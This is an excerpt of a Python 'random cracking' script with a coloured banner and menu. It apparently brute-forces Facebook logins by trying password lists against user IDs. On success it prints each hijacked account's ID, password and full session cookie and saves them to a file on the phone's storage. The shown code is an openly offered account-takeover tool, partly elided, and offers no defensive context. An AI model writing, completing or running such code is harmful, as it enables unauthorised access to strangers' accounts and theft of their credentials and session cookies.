...
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝
\033[0;92m┏━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\033[0;92m
┃\033[1;33mDEVOLPER : FUCK BOY      ┃\033[1;32mTOOL : \033[1;36mBD/ONLY ┃    
┃\033[1;96mFACEBOOK :\033[1;32m ALONE BOY     ┃\033[1;33mVERSION : \033[1;32m1.0  ┃
\033[0;92m┣━━━━━━━━━━━━━━━━━━━━━━┳━━┻━━━━━━━━━━━━━━━┫\033[0;92m    
┃\033[1;97mGITHUB : \033[1;32mALONE243     ┃\033[1;33mTYPE :\033[1;97m FREE RANDOM┃    
\033[0;92m┗━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━┛\033[0;92m"""
def Main():
	os.system('clear')
	print(logo)
	print("[\033[1;97mA\33[1;92m] START RANDOM CRACKING")
	print("[\033[1;97mB\33[1;92m] MAIN ADMIN FB ACCOUNT")
	print("[\033[1;97mC\33[1;92m] JOIN FACEBOOK  GROUP")
	print('[\033[1;97mD\33[1;92m] EXIT PROGRAMMING')
	opt = input('[+] SELECT :')
	if opt in ["A","1"]:
		virusA()
	if opt in ["B","2"]:
		os.system('xdg-open https://facebook.com/groups/5711448582285669/');time.sleep(1)
		fb()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/profile.php?id=100091361790904');time.sleep(1)
		group()
	if opt in ["D","0"]:
		exit()
	else:
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;91m[\033[0;92mFINDING\033[1;91m]\033[1;97m<>\033[1;91m[\033[1;33m%s/%s\033[1;91m]\033[1;97m\033[1;97m<>\033[1;91m[\033[0;92mDAKA:%s\033[1;91m]\033[1;91m '%(loop,tl,len(oks))),
            sys.stdout.flush()
           ...
           'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid=coki[151:166]
                print(f'\r\033[1;91m [\033[0;92mDAKA\033[1;91m]\033[0;92m '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;36m=[🤍]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/DAKA-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
